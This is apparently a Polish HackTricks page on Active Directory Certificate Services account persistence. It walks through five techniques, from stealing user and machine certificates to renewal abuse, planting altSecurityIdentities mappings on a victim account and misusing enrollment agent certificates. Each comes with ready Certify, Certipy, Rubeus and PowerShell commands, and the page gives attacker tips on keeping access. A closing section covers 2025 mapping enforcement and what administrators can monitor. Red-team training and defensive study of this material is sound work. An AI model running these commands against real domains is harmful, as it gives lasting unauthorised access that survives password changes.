# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**To jest małe podsumowanie rozdziałów dotyczących utrzymywania konta z niesamowitych badań z [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Zrozumienie kradzieży poświadczeń aktywnego użytkownika za pomocą certyfikatów – PERSIST1

W scenariuszu, w którym certyfikat umożliwiający uwierzytelnianie w domenie może być żądany przez użytkownika, atakujący ma możliwość zażądania i kradzieży tego certyfikatu, aby utrzymać trwałość w sieci. Domyślnie szablon `User` w Active Directory pozwala na takie żądania, chociaż czasami może być wyłączony.

Używając [Certify](https://github.com/GhostPack/Certify) lub [Certipy](https://github.com/ly4k/Certipy), możesz wyszukiwać włączone szablony, które pozwalają na uwierzytelnianie klienta, a następnie zażądać jednego:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Moc certyfikatu polega na jego zdolności do uwierzytelniania jako użytkownik, do którego należy, niezależnie od zmian hasła, pod warunkiem, że certyfikat pozostaje ważny.

Możesz przekonwertować PEM na PFX i użyć go do uzyskania TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Uwaga: W połączeniu z innymi technikami (patrz sekcje THEFT), uwierzytelnianie oparte na certyfikatach umożliwia trwały dostęp bez dotykania LSASS, a nawet z kontekstów niepodwyższonych.

## Uzyskiwanie trwałości maszyny za pomocą certyfikatów - PERSIST2

Jeśli atakujący ma podwyższone uprawnienia na hoście, może zarejestrować konto maszyny skompromitowanego systemu dla certyfikatu, używając domyślnego szablonu `Machine`. Uwierzytelnienie jako maszyna umożliwia S4U2Self dla lokalnych usług i może zapewnić trwałą trwałość hosta:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Wykorzystanie okresów ważności i odnowienia szablonów certyfikatów pozwala atakującemu na utrzymanie długoterminowego dostępu. Jeśli posiadasz wcześniej wydany certyfikat i jego klucz prywatny, możesz go odnowić przed wygaśnięciem, aby uzyskać nowy, długoterminowy identyfikator bez pozostawiania dodatkowych artefaktów żądania związanych z oryginalnym podmiotem.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Wskazówka operacyjna: Śledź czas trwania plików PFX posiadanych przez atakującego i odnawiaj je wcześnie. Odnowienie może również spowodować, że zaktualizowane certyfikaty będą zawierać nowoczesne rozszerzenie mapowania SID, co pozwoli na ich użycie zgodnie z surowszymi zasadami mapowania DC (patrz następna sekcja).

## Sadzenie jawnych mapowań certyfikatów (altSecurityIdentities) – PERSIST4

Jeśli możesz zapisać do atrybutu `altSecurityIdentities` docelowego konta, możesz jawnie powiązać certyfikat kontrolowany przez atakującego z tym kontem. To utrzymuje się po zmianach hasła i, przy użyciu silnych formatów mapowania, pozostaje funkcjonalne pod nowoczesnym egzekwowaniem DC.

Ogólny przebieg:

1. Uzyskaj lub wydaj certyfikat klienta, który kontrolujesz (np. zarejestruj szablon `User` jako siebie).
2. Wyodrębnij silny identyfikator z certyfikatu (Issuer+Serial, SKI lub SHA1-PublicKey).
3. Dodaj jawne mapowanie na `altSecurityIdentities` głównego użytkownika ofiary, używając tego identyfikatora.
4. Uwierzytelnij się za pomocą swojego certyfikatu; DC mapuje go do ofiary za pomocą jawnego mapowania.

Przykład (PowerShell) używając silnego mapowania Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Następnie uwierzytelnij się za pomocą swojego PFX. Certipy uzyska TGT bezpośrednio:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notatki
- Używaj tylko silnych typów mapowania: X509IssuerSerialNumber, X509SKI lub X509SHA1PublicKey. Słabe formaty (Subject/Issuer, Subject-only, RFC822 email) są przestarzałe i mogą być blokowane przez politykę DC.
- Łańcuch certyfikatów musi prowadzić do zaufanego korzenia przez DC. CAs przedsiębiorstw w NTAuth są zazwyczaj zaufane; niektóre środowiska również ufają publicznym CAs.

Aby uzyskać więcej informacji na temat słabych jawnych mapowań i ścieżek ataku, zobacz:

{{#ref}}
domain-escalation.md
{{#endref}}

## Agent rejestracji jako trwałość – PERSIST5

Jeśli uzyskasz ważny certyfikat Agenta Żądania Certyfikatu/Agenta Rejestracji, możesz w dowolnym momencie tworzyć nowe certyfikaty umożliwiające logowanie w imieniu użytkowników i przechowywać agenta PFX offline jako token trwałości. Workflow nadużycia:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Unieważnienie certyfikatu agenta lub uprawnień szablonu jest wymagane do usunięcia tej persystencji.

## 2025 Silne egzekwowanie mapowania certyfikatów: wpływ na persystencję

Microsoft KB5014754 wprowadził silne egzekwowanie mapowania certyfikatów na kontrolerach domeny. Od 11 lutego 2025 r. kontrolery domeny domyślnie stosują pełne egzekwowanie, odrzucając słabe/niejednoznaczne mapowania. Praktyczne implikacje:

- Certyfikaty sprzed 2022 roku, które nie mają rozszerzenia mapowania SID, mogą nie przejść mapowania domyślnego, gdy kontrolery domeny są w pełnym egzekwowaniu. Atakujący mogą utrzymać dostęp, odnawiając certyfikaty przez AD CS (aby uzyskać rozszerzenie SID) lub sadząc silne jawne mapowanie w `altSecurityIdentities` (PERSIST4).
- Jawne mapowania używające silnych formatów (Issuer+Serial, SKI, SHA1-PublicKey) nadal działają. Słabe formaty (Issuer/Subject, Subject-only, RFC822) mogą być blokowane i powinny być unikać dla persystencji.

Administratorzy powinni monitorować i ostrzegać o:
- Zmianach w `altSecurityIdentities` oraz wydaniach/odnowieniach certyfikatów agenta rejestracji i użytkownika.
- Dziennikach wydania CA dla żądań w imieniu oraz nietypowych wzorcach odnawiania.

## Odniesienia

- Microsoft. KB5014754: Zmiany w uwierzytelnianiu opartym na certyfikatach na kontrolerach domeny Windows (harmonogram egzekwowania i silne mapowania).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Odniesienie do poleceń (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
